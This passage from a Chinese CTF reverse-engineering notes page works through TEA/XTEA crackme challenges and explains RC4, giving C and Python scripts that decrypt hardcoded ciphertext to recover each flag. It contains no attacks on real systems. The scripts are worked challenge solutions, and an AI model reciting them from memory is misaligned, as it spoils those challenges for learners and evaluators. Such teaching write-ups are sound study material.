<span class="hljs-operator">=</span> v9<span class="hljs-comment">;</span><br></code></pre></td></tr></table></figure><p>&#x2F;&#x2F; v8备份到v9;</p><p>跟进sub_140011145(v8, v9);发现就是一个备份功能的函数</p><p><img src="https://cdn.nlark.com/yuque/0/2024/png/42988179/1721464330297-37f9c77a-2c20-4c0d-9c48-c57216d8e13b.png"></p><p>&#x2F;&#x2F; v7为key，v8为输入的值，进行tea加密</p><p>sub_1400112B7(v8, v7);</p><p><img src="https://cdn.nlark.com/yuque/0/2024/png/42988179/1721464401788-9100f9f8-425b-4b90-b9fc-8eacfbef4e37.png"></p><p>进入 sub_140011B60 函数，得到加密后的数据，开始写脚本</p><p><img src="https://cdn.nlark.com/yuque/0/2024/png/42988179/1721464531316-d3667f6e-f3c0-4e89-bcc4-3217d96cca10.png"></p><h3 id="cexp"><a href="#cexp" class="headerlink" title="cexp"></a>cexp</h3><p>经典c代码</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br></pre></td><td class="code"><pre><code class="hljs cpp"><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;stdio.h&gt;</span></span><br><br><span class="hljs-function"><span class="hljs-type">int</span> <span class="hljs-title">main</span><span class="hljs-params">()</span> </span>&#123;<br>    <span class="hljs-type">int</span> key[] = &#123;<span class="hljs-number">2233</span>, <span class="hljs-number">4455</span>, <span class="hljs-number">6677</span>, <span class="hljs-number">8899</span>&#125;; <span class="hljs-comment">// 密钥数组</span><br>    <span class="hljs-type">unsigned</span> <span class="hljs-type">int</span> value[<span class="hljs-number">10</span>]; <span class="hljs-comment">// 用于存储加密数据的数组</span><br>    <br>    <span class="hljs-comment">// 初始化加密数据</span><br>    value[<span class="hljs-number">0</span>] = <span class="hljs-number">0x1A800BDA</span>;<br>    value[<span class="hljs-number">1</span>] = <span class="hljs-number">0xF7A6219B</span>;<br>    value[<span class="hljs-number">2</span>] = <span class="hljs-number">0x491811D8</span>;<br>    value[<span class="hljs-number">3</span>] = <span class="hljs-number">0xF2013328</span>;<br>    value[<span class="hljs-number">4</span>] = <span class="hljs-number">0x156C365B</span>;<br>    value[<span class="hljs-number">5</span>] = <span class="hljs-number">0x3C6EAAD8</span>;<br>    value[<span class="hljs-number">6</span>] = <span class="hljs-number">0x84D4BF28</span>;<br>    value[<span class="hljs-number">7</span>] = <span class="hljs-number">0xF11A7EE7</span>;<br>    value[<span class="hljs-number">8</span>] = <span class="hljs-number">0x3313B252</span>;<br>    value[<span class="hljs-number">9</span>] = <span class="hljs-number">0xDD9FE279</span>;<br>    <br>    <span class="hljs-type">int</span> delta = <span class="hljs-number">0xF462900</span>; <span class="hljs-comment">// 一个常量，用于加密算法</span><br>    <span class="hljs-type">int</span> i = <span class="hljs-number">0</span>;<br>    <span class="hljs-type">int</span> wheel; <span class="hljs-comment">// 轮数</span><br>    <span class="hljs-type">int</span> sum = <span class="hljs-number">0</span>;<br>    <br>    <span class="hljs-comment">// 逆算法解密</span><br>    <span class="hljs-keyword">for</span> (i = <span class="hljs-number">8</span>; i &gt;= <span class="hljs-number">0</span>; i--) &#123;<br>        wheel = <span class="hljs-number">33</span>; <span class="hljs-comment">// 33轮加密</span><br>        sum = delta * (i + wheel);<br>        <span class="hljs-keyword">while</span> (wheel--) &#123;<br>            sum -= delta;<br>            value[i + <span class="hljs-number">1</span>] -= (sum + key[(sum &gt;&gt; <span class="hljs-number">11</span>) &amp; <span class="hljs-number">3</span>]) ^ (value[i] + ((value[i] &gt;&gt; <span class="hljs-number">5</span>) ^ (<span class="hljs-number">16</span> * value[i])));<br>            value[i] -= sum ^ (value[i + <span class="hljs-number">1</span>] + ((value[i + <span class="hljs-number">1</span>] &gt;&gt; <span class="hljs-number">5</span>) ^ (<span class="hljs-number">16</span> * value[i + <span class="hljs-number">1</span>]))) ^ (sum + key[sum &amp; <span class="hljs-number">3</span>]);<br>        &#125;<br>    &#125;<br>    <br>    <span class="hljs-comment">// 将解密后的数据转换为字符并输出</span><br>    <span class="hljs-keyword">for</span> (i = <span class="hljs-number">0</span>; i &lt;= <span class="hljs-number">9</span>; i++) &#123;<br>        <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;%c&quot;</span>, (value[i] &gt;&gt; <span class="hljs-number">24</span>) &amp; <span class="hljs-number">0xFF</span>); <span class="hljs-comment">// 高8位</span><br>        <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;%c&quot;</span>, (value[i] &gt;&gt; <span class="hljs-number">16</span>) &amp; <span class="hljs-number">0xFF</span>); <span class="hljs-comment">// 次高8位</span><br>        <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;%c&quot;</span>, (value[i] &gt;&gt; <span class="hljs-number">8</span>) &amp; <span class="hljs-number">0xFF</span>);  <span class="hljs-comment">// 次低8位</span><br>        <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;%c&quot;</span>, value[i] &amp; <span class="hljs-number">0xFF</span>);         <span class="hljs-comment">// 低8位</span><br>    &#125;<br>    <br>    <span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;<br>&#125;<br></code></pre></td></tr></table></figure><h3 id="pyexp（会有乱码）"><a href="#pyexp（会有乱码）" class="headerlink" title="pyexp（会有乱码）"></a>pyexp（会有乱码）</h3><p>python代码可以会输出乱码，主要是溢出的问题，去掉乱码投机正确，还是c比较科学一点</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">def</span> <span class="hljs-title function_">main</span>():<br>    key = [<span class="hljs-number">2233</span>, <span class="hljs-number">4455</span>, <span class="hljs-number">6677</span>, <span class="hljs-number">8899</span>]  <span class="hljs-comment"># 密钥数组</span><br>    value = [<span class="hljs-number">0x1A800BDA</span>, <span class="hljs-number">0xF7A6219B</span>, <span class="hljs-number">0x491811D8</span>, <span class="hljs-number">0xF2013328</span>, <span class="hljs-number">0x156C365B</span>,<br>             <span class="hljs-number">0x3C6EAAD8</span>, <span class="hljs-number">0x84D4BF28</span>, <span class="hljs-number">0xF11A7EE7</span>, <span class="hljs-number">0x3313B252</span>, <span class="hljs-number">0xDD9FE279</span>]  <span class="hljs-comment"># 初始化加密数据</span><br><br>    delta = <span class="hljs-number">0x0F462900</span>  <span class="hljs-comment"># 一个常量，用于加密算法</span><br>    <span class="hljs-built_in">sum</span> = <span class="hljs-number">0</span><br><br>    <span class="hljs-comment"># 逆算法解密</span><br>    <span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">8</span>, -<span class="hljs-number">1</span>, -<span class="hljs-number">1</span>):<br>        wheel = <span class="hljs-number">33</span>  <span class="hljs-comment"># 33轮加密</span><br>        <span class="hljs-built_in">sum</span> = delta * (i + wheel)<br>        <span class="hljs-keyword">while</span> wheel &gt; <span class="hljs-number">0</span>:<br>            <span class="hljs-built_in">sum</span> -= delta<br>            <span class="hljs-built_in">sum</span> &amp;= <span class="hljs-number">0xFFFFFFFF</span>  <span class="hljs-comment"># 保持为32位</span><br>            value[i + <span class="hljs-number">1</span>] -= ((<span class="hljs-built_in">sum</span> + key[(<span class="hljs-built_in">sum</span> &gt;&gt; <span class="hljs-number">11</span>) &amp; <span class="hljs-number">3</span>]) ^ (value[i] + ((value[i] &gt;&gt; <span class="hljs-number">5</span>) ^ (<span class="hljs-number">16</span> * value[i]))))<br>            value[i + <span class="hljs-number">1</span>] &amp;= <span class="hljs-number">0xFFFFFFFF</span>  <span class="hljs-comment"># 保持为32位</span><br>            value[i] -= (<span class="hljs-built_in">sum</span> ^ (value[i + <span class="hljs-number">1</span>] + ((value[i + <span class="hljs-number">1</span>] &gt;&gt; <span class="hljs-number">5</span>) ^ (<span class="hljs-number">16</span> * value[i + <span class="hljs-number">1</span>]))) ^ (<span class="hljs-built_in">sum</span> + key[<span class="hljs-built_in">sum</span> &amp; <span class="hljs-number">3</span>]))<br>            value[i] &amp;= <span class="hljs-number">0xFFFFFFFF</span>  <span class="hljs-comment"># 保持为32位</span><br>            wheel -= <span class="hljs-number">1</span><br><br>    <span class="hljs-comment"># 将解密后的数据转换为字符并输出</span><br>    <span class="hljs-keyword">for</span> val <span class="hljs-keyword">in</span> value:<br>        <span class="hljs-built_in">print</span>(<span class="hljs-built_in">chr</span>((val &gt;&gt; <span class="hljs-number">24</span>) &amp; <span class="hljs-number">0xFF</span>), end=<span class="hljs-string">&#x27;&#x27;</span>)  <span class="hljs-comment"># 高8位</span><br>        <span class="hljs-built_in">print</span>(<span class="hljs-built_in">chr</span>((val &gt;&gt; <span class="hljs-number">16</span>) &amp; <span class="hljs-number">0xFF</span>), end=<span class="hljs-string">&#x27;&#x27;</span>)  <span class="hljs-comment"># 次高8位</span><br>        <span class="hljs-built_in">print</span>(<span class="hljs-built_in">chr</span>((val &gt;&gt; <span class="hljs-number">8</span>) &amp; <span class="hljs-number">0xFF</span>), end=<span class="hljs-string">&#x27;&#x27;</span>)  <span class="hljs-comment"># 次低8位</span><br>        <span class="hljs-built_in">print</span>(<span class="hljs-built_in">chr</span>(val &amp; <span class="hljs-number">0xFF</span>), end=<span class="hljs-string">&#x27;&#x27;</span>)  <span class="hljs-comment"># 低8位</span><br><br><br><span class="hljs-keyword">if</span> __name__ == <span class="hljs-string">&quot;__main__&quot;</span>:<br>    main()<br></code></pre></td></tr></table></figure><h2 id="2、"><a href="#2、" class="headerlink" title="2、"></a>2、</h2><p><img src="https://cdn.nlark.com/yuque/0/2024/png/42988179/1722054641314-437f3875-8b54-40ad-b516-4b8aeb067346.png"></p><h3 id="代码分析"><a href="#代码分析" class="headerlink" title="代码分析"></a>代码分析</h3><figure class="highlight smali"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><code class="hljs smali">scanf(<span class="hljs-string">&quot;%s&quot;</span>, v5);<br>  v9 = v5;<br>  // 将输入的值赋入 v4的后八位<br>  for ( i = 0; i &lt;= 5; ++i )<br>    v4[i + 8] = *v9++;<br>  // 两两进行XTea加密<br>  for ( j = 0; j &lt;= 2; ++j )<br>    tea_encrypt(&amp;v4[2 * j + 8], &amp;key);<br>  // 加密后的字符串要等于这些<br>    v4[0] = -1054939302;<br>    v4[1] = -1532163725;<br>    v4[2] = -165900264;<br>    v4[3] = 853769165;<br>    v4[4] = 768352038;<br>    v4[5] = 876839116;<br>  for ( k = 0; k &lt;= 5; ++k )<br>  &#123;<br>   <span class="hljs-built_in"> if </span>( v4[k] != v4[k + 8] )<br>    &#123;<br>      printf(<span class="hljs-string">&quot;ERROR!&quot;</span>);<br>      exit(9);<br>    &#125;<br>  &#125;<br></code></pre></td></tr></table></figure><h3 id="按d，将key合成为4位、8字节的形式，再提取"><a href="#按d，将key合成为4位、8字节的形式，再提取" class="headerlink" title="按d，将key合成为4位、8字节的形式，再提取"></a>按d，将key合成为4位、8字节的形式，再提取</h3><h3 id=""><a href="#" class="headerlink" title=""></a><img src="https://cdn.nlark.com/yuque/0/2024/png/42988179/1722055208022-54aca640-c283-4a51-97c1-ff089748e031.png"></h3><h3 id="tea加密函数"><a href="#tea加密函数" class="headerlink" title="tea加密函数"></a>tea加密函数</h3><h3 id="-1"><a href="#-1" class="headerlink" title=""></a><img src="https://cdn.nlark.com/yuque/0/2024/png/42988179/1722054654216-26498323-00c8-402e-ba33-5de480f1e045.png"></h3><h3 id="exp"><a href="#exp" class="headerlink" title="exp"></a>exp</h3><figure class="highlight stata"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><code class="hljs stata">#<span class="hljs-keyword">include</span>&lt;stdio.<span class="hljs-keyword">h</span>&gt;<br><br>int main()<br>&#123;<br>    unsigned int <span class="hljs-keyword">enc</span>[6] = &#123;0xC11EE75A, 0xA4AD0973, 0xF61C9018, 0x32E37BCD, 0x2DCC1F26, 0x344380CC&#125;;<br>    unsigned int key[4] = &#123;0x10203, 0x4050607, 0x8090A0B, 0x0C0D0E0F&#125;;<br>    int i, j;<br>    long <span class="hljs-keyword">sum</span> = 0, delta = 0x61C88647;<br>    <span class="hljs-comment">// 解码</span><br>    <span class="hljs-keyword">for</span>(i=0;i &lt; 6;i+=2)&#123;<br>       <span class="hljs-keyword">sum</span> =  0 - (32 * delta);<br>       <span class="hljs-keyword">for</span>(j = 0; j &lt; 32; j++) &#123;<br>          <span class="hljs-keyword">enc</span>[i+1] -= (((<span class="hljs-keyword">enc</span>[i] &gt;&gt; 5) ^ (16 * <span class="hljs-keyword">enc</span>[i])) + <span class="hljs-keyword">enc</span>[i]) ^ (key[((<span class="hljs-keyword">sum</span> &gt;&gt; 11) &amp; 3)] + <span class="hljs-keyword">sum</span>);<br>          <span class="hljs-keyword">sum</span> += delta;<br>          <span class="hljs-keyword">enc</span>[i] -= ((((<span class="hljs-keyword">enc</span>[i+1] &gt;&gt; 5) ^ (16 * <span class="hljs-keyword">enc</span>[i+1])) + <span class="hljs-keyword">enc</span>[i+1]) ^ key[<span class="hljs-keyword">sum</span> &amp; 3] + <span class="hljs-keyword">sum</span>);<br>       &#125;<br>    &#125;<br>    <span class="hljs-comment">// 打印</span><br>    <span class="hljs-keyword">for</span> (i = 0; i &lt; 6; i++)<br>    &#123;<br>       <span class="hljs-keyword">for</span> (j = 0; j&lt;=3; j++)<br>       &#123;<br>          printf(<span class="hljs-string">&quot;%c&quot;</span>, (<span class="hljs-keyword">enc</span>[i] &gt;&gt; (j * 8)) &amp; 0xFF);<br>       &#125;<br>    &#125;<br><br>    <span class="hljs-keyword">return</span> 0;<br>&#125;<br></code></pre></td></tr></table></figure><p><img src="https://cdn.nlark.com/yuque/0/2024/png/42988179/1722054984122-9065a0d4-00c2-489e-be39-81b6ca45ea63.png"></p><h2 id="ezzzz"><a href="#ezzzz" class="headerlink" title="ezzzz"></a>ezzzz</h2><p>先每8位转化成一个数据</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">def</span> <span class="hljs-title function_">string_to_hex_with_prefix</span>(<span class="hljs-params">input_string</span>):<br>    <span class="hljs-comment"># 创建一个空的结果数组</span><br>    hex_result = []<br><br>    <span class="hljs-comment"># 每 8 个字符一组</span><br>    <span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">0</span>, <span class="hljs-built_in">len</span>(input_string), <span class="hljs-number">8</span>):<br>        chunk = input_string[i:i + <span class="hljs-number">8</span>]<br><br>        <span class="hljs-comment"># 将每组字符转为十六进制并加上 &#x27;0x&#x27; 前缀</span><br>        hex_value = <span class="hljs-built_in">int</span>(chunk.encode(<span class="hljs-string">&#x27;utf-8&#x27;</span>).<span class="hljs-built_in">hex</span>())<br><br>        <span class="hljs-comment"># 添加到数组中</span><br>        hex_result.append(hex_value)<br><br>    <span class="hljs-keyword">return</span> hex_result<br><br><br><span class="hljs-comment"># 示例</span><br>input_string = <span class="hljs-string">&quot;f1f186b25a96c782e6c63a0b70b61b5ced6bf84889700d6b09381b5ccb2f24fab1c79e796d822d9cdcc55f760f780e750d65c4afb89084a9e978c3827a8dd81091f28df3a84dbacab4d75f75f19af8e5b90f80fcfc10a5c3d20679fb2bc734c8ccb31c921ac52ad3e7f922b72e24d923fb4ce9f53548a9e571ebc25adf38862e10059186327509463dd4d54c905abc36c26d5312d2cd42c0772d99e50cd4c4665c3178d63a7ffe71ada251c070568d5a5798c2921ec0f7fc3ae9d8418460762930ca6a2dccef51d2a1a8085491b0f82d686ca34774c52d0f0f26449fc28d362c86f3311b8adc4fb1a4497e34e0f0915d&quot;</span>  <span class="hljs-comment"># 输入字符串</span><br>hex_output = string_to_hex_with_prefix(input_string)<br><br><span class="hljs-comment"># 输出结果</span><br><span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;Hexadecimal array:&quot;</span>, hex_output)<br></code></pre></td></tr></table></figure><p><img src="https://cdn.nlark.com/yuque/0/2024/png/42988179/1731845706786-36a034f2-3c1d-4e61-8f9d-7216d9758903.png"></p><h1 id="XTEA例题"><a href="#XTEA例题" class="headerlink" title="XTEA例题"></a>XTEA例题</h1><h2 id="1、-1"><a href="#1、-1" class="headerlink" title="1、"></a>1、</h2><h2 id="-2"><a href="#-2" class="headerlink" title=""></a><img src="https://cdn.nlark.com/yuque/0/2025/png/42988179/1741071893775-0ce51887-c1a4-444a-acf3-1fc22abe7c73.png"></h2><p>这里是典型的XTEA加密和异或加密，但是根据给定的key和算法，计算出来的是一个假flag：<br>fakeflag_plz_Try_more_hard_to_find_the_true_flag</p><h1 id="RC4"><a href="#RC4" class="headerlink" title="RC4"></a>RC4</h1><p><a href="https://blog.csdn.net/Jsy050906/article/details/137167432?ops_request_misc=%257B%2522request%255Fid%2522%253A%252238E31D7F-6C34-4148-BF0E-3D27CE346A88%2522%252C%2522scm%2522%253A%252220140713.130102334..%2522%257D&request_id=38E31D7F-6C34-4148-BF0E-3D27CE346A88&biz_id=0&utm_medium=distribute.pc_search_result.none-task-blog-2~all~top_click~default-2-137167432-null-null.142%5Ev100%5Epc_search_result_base6&utm_term=rc4%E7%AE%97%E6%B3%95&spm=1018.2226.3001.4187">详细了解RC4加密算法-CSDN博客</a></p><h1 id="算法-1"><a href="#算法-1" class="headerlink" title="算法"></a>算法</h1><p>在<a href="https://zh.wikipedia.org/wiki/%E5%AF%86%E7%A2%BC%E5%AD%B8">密码学</a>中，<strong>RC4</strong>（来自 Rivest Cipher 4 的缩写）是一种<a href="https://zh.wikipedia.org/wiki/%E6%B5%81%E5%8A%A0%E5%AF%86">流加密</a>算法，<a href="https://zh.wikipedia.org/wiki/%E5%AF%86%E9%92%A5">密钥</a>长度可变。它加解密使用相同的密钥，因此也属于<a href="https://zh.wikipedia.org/wiki/%E5%AF%B9%E7%A7%B0%E5%8A%A0%E5%AF%86">对称加密算法</a>。RC4 是<a href="https://zh.wikipedia.org/wiki/%E6%9C%89%E7%B7%9A%E7%AD%89%E6%95%88%E5%8A%A0%E5%AF%86">有线等效加密</a>（WEP）中采用的加密算法，也曾经是 <a href="https://zh.wikipedia.org/wiki/%E4%BC%A0%E8%BE%93%E5%B1%82%E5%AE%89%E5%85%A8%E5%8D%8F%E8%AE%AE">TLS</a> 可采用的算法之一。</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br></pre></td><td class="code"><pre><code class="hljs cpp"><span class="hljs-function"><span class="hljs-type">void</span> <span class="hljs-title">rc4_init</span><span class="hljs-params">(<span class="hljs-type">unsigned</span> <span class="hljs-type">char</span> *s, <span class="hljs-type">unsigned</span> <span class="hljs-type">char</span> *key, <span class="hljs-type">unsigned</span> <span class="hljs-type">long</span> Len)</span> <span class="hljs-comment">//初始化函数</span></span><br><span class="hljs-function"></span>&#123;<br>    <span class="hljs-type">int</span> i =<span class="hljs-number">0</span>, j = <span class="hljs-number">0</span>;<br>    <span class="hljs-type">unsigned</span> <span class="hljs-type">char</span> k[<span class="hljs-number">256</span>] = &#123;<span class="hljs-number">0</span>&#125;; <span class="hljs-comment">// 必须为无符号类型，否则会导致密文部分错误</span><br>    <span class="hljs-type">unsigned</span> <span class="hljs-type">char</span> tmp = <span class="hljs-number">0</span>;<br>    <span class="hljs-keyword">for</span> (i=<span class="hljs-number">0</span>;i&lt;<span class="hljs-number">256</span>;i++) &#123;<br>        s[i] = i;<br>        k[i] = key[i%Len];<br>    &#125;<br>    <span class="hljs-keyword">for</span> (i=<span class="hljs-number">0</span>; i&lt;<span class="hljs-number">256</span>; i++) &#123;<br>        j=(j+s[i]+k[i])%<span class="hljs-number">256</span>;<br>        tmp = s[i];<br>        s[i] = s[j]; <span class="hljs-comment">//交换s[i]和s[j]</span><br>        s[j] = tmp;<br>    &#125;<br> &#125;<br><br><span class="hljs-function"><span class="hljs-type">void</span> <span class="hljs-title">rc4_crypt</span><span class="hljs-params">(<span class="hljs-type">unsigned</span> <span class="hljs-type">char</span> *s, <span class="hljs-type">unsigned</span> <span class="hljs-type">char</span> *Data, <span class="hljs-type">unsigned</span> <span class="hljs-type">long</span> Len)</span> <span class="hljs-comment">//加解密</span></span><br><span class="hljs-function"></span>&#123;<br>    <span class="hljs-type">int</span> i = <span class="hljs-number">0</span>, j = <span class="hljs-number">0</span>, t = <span class="hljs-number">0</span>;<br>    <span class="hljs-type">unsigned</span> <span class="hljs-type">long</span> k = <span class="hljs-number">0</span>;<br>    <span class="hljs-type">unsigned</span> <span class="hljs-type">char</span> tmp;<br>    <span class="hljs-keyword">for</span>(k=<span class="hljs-number">0</span>;k&lt;Len;k++) &#123;<br>        i=(i<span class="hljs-number">+1</span>)%<span class="hljs-number">256</span>;<br>        j=(j+s[i])%<span class="hljs-number">256</span>;<br>        tmp = s[i];<br>        s[i] = s[j]; <span class="hljs-comment">//交换s[x]和s[y]</span><br>        s[j] = tmp;<br>        t=(s[i]+s[j])%<span class="hljs-number">256</span>;<br>        Data[k] ^= s[t];<br>     &#125;<br>&#125;<br></code></pre></td></tr></table></figure><p>其伪代码表示为：</p><p>初始化长度为 256 的 <a href="https://zh.wikipedia.org/wiki/S%E7%9B%92">S 盒</a>。第一个 for 循环将 0 到 255 的互不重复的元素装入 S 盒。第二个 for 循环根据密钥打乱 S 盒。</p><figure class="highlight css"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs css">for <span class="hljs-selector-tag">i</span> <span class="hljs-selector-tag">from</span> <span class="hljs-number">0</span> <span class="hljs-selector-tag">to</span> <span class="hljs-number">255</span><br>     S<span class="hljs-selector-attr">[i]</span> := i<br> endfor<br> j := <span class="hljs-number">0</span><br> <span class="hljs-built_in">for</span>( i=<span class="hljs-number">0</span> ; <span class="hljs-selector-tag">i</span>&lt;<span class="hljs-number">256</span> ; <span class="hljs-selector-tag">i</span>++)<br>     j := (j + S[i] + key[i mod keylength]) % <span class="hljs-number">256</span><br>     swap values of S[i] and S[j]<br> endfor<br></code></pre></td></tr></table></figure><p>下面 i,j 是两个指针。每收到一个字节，就进行 while 循环。通过一定的算法（(a),(b)）定位 S 盒中的一个元素，并与输入字节异或，得到 k。循环中还改变了 S 盒（©）。如果输入的是<a href="https://zh.wikipedia.org/wiki/%E6%98%8E%E6%96%87">明文</a>，输出的就是<a href="https://zh.wikipedia.org/wiki/%E5%AF%86%E6%96%87">密文</a>；如果输入的是密文，输出的就是明文。</p><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><code class="hljs go">i := <span class="hljs-number">0</span><br> j := <span class="hljs-number">0</span><br> while GeneratingOutput:<br>     i := (i + <span class="hljs-number">1</span>) mod <span class="hljs-number">256</span>   <span class="hljs-comment">//a</span><br>     j := (j + S[i]) mod <span class="hljs-number">256</span> <span class="hljs-comment">//b</span><br>     swap values of S[i] and S[j]  <span class="hljs-comment">//c</span><br>     k := inputByte ^ S[(S[i] + S[j]) % <span class="hljs-number">256</span>]<br>     output K<br> endwhile<br></code></pre></td></tr></table></figure><p>此算法保证每 256 次循环中 S 盒的每个元素至少被交换过一次</p><h2 id="pyexp"><a href="#pyexp" class="headerlink" title="pyexp"></a>pyexp</h2><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">def</span> <span class="hljs-title function_">rc4_init</span>(<span class="hljs-params">key</span>):<br>    s = <span class="hljs-built_in">list</span>(<span class="hljs-built_in">range</span>(<span class="hljs-number">256</span>))  <span class="hljs-comment"># 初始化 s 为 0 到 255 的列表</span><br>    j = <span class="hljs-number">0</span><br>    k = <span class="hljs-built_in">bytearray</span>(<span class="hljs-number">256</span>)  <span class="hljs-comment"># 必须为无符号字节数组</span><br>    key_len = <span class="hljs-built_in">len</span>(key)<br><br>    <span class="hljs-comment"># 填充 k 并执行密钥调度算法（KSA）</span><br>    <span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">256</span>):<br>        k[i] = key[i % key_len]<br><br>    <span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">256</span>):<br>        j = (j + s[i] + k[i]) % <span class="hljs-number">256</span><br>        s[i], s[j] = s[j], s[i]  <span class="hljs-comment"># 交换 s[i] 和 s[j]</span><br><br>    <span class="hljs-keyword">return</span> s  <span class="hljs-comment"># 返回初始化后的状态数组 